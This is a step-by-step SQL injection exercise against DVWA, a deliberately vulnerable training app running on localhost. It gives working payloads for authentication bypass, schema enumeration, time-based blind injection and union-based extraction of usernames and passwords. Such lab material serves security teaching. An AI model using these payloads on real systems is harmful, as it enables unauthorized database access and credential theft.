# SQL Injection Exercise 

1. **Access DVWA**:
   - Open your browser and navigate to `http://localhost:89`.

2. **Log In to DVWA**:
   - Use the credentials: **Username**: `admin`, **Password**: `password`.

3. **Set Security Level**:
   - Go to the **DVWA Security** tab and set the security level to **Low**.

4. **Select the SQL Injection Module**:
   - In the left sidebar, select **SQL Injection** from the list of modules.

5. **Perform a Basic SQL Injection**:
   - You will see a field where you can enter a **User ID** to retrieve information from the database.
   - Normally, entering `1` and clicking **Submit** returns information associated with User ID 1.

6. **Inject SQL Payloads**:

| **Use Case**                      | **Payload**                                                            | **Explanation**                                                                                   | **Expected Behavior**                                                                                       |
|-----------------------------------|------------------------------------------------------------------------|---------------------------------------------------------------------------------------------------|-------------------------------------------------------------------------------------------------------------|
| **Authentication Bypass**         | `' OR '1'='1 --`                                                      | Bypasses authentication by injecting an always-true condition.                                   | Logs in successfully without valid credentials.                                                             |
| **Extract Database Version**      | `1' UNION SELECT null, @@version --`                                  | Retrieves the database version (`@@version` is MySQL-specific).                                  | Displays the MySQL version, e.g., `8.0.28`.                                                                 |
| **Retrieve Current Database Name**| `1' UNION SELECT null, database() --`                                 | Extracts the name of the currently selected database.                                             | Displays the database name, e.g., `dvwa`.                                                                   |
| **List All Tables**               | `1' UNION SELECT null, table_name FROM information_schema.tables --`  | Fetches all table names from the `information_schema.tables`.                                     | Displays a list of table names such as `users`, `logs`, etc.                                                |
| ***List Columns in a Table***       | `1' UNION SELECT null, column_name FROM information_schema.columns WHERE table_name='users' --` | Lists column names in the `users` table.                                                         | Displays column names like `id`, `username`, `password`.                                                   |
| **Time-Based Blind Injection**    | `1' AND IF(1=1, SLEEP(5), null) --`                                   | Delays response by 5 seconds if the condition `1=1` is true. Useful for blind SQL Injection.      | A 5-second delay confirms successful injection.     

# Basic Union-Based Injection to Retrieve Usernames and Passwords

 ```sql
 1' UNION SELECT null, user, password FROM users --
```

***It will result in an error, that is we need to determine exact number of columns in the original query.***

 ```sql
1' ORDER BY 3 --
1' ORDER BY 2 --
```

***Adjust the number after ORDER BY until you no longer get an error. This determines the number of columns in the original query.***

**After we know the exact number of columns (in this case 2), we update our query**

```sql
1' UNION SELECT user, password FROM users --
```

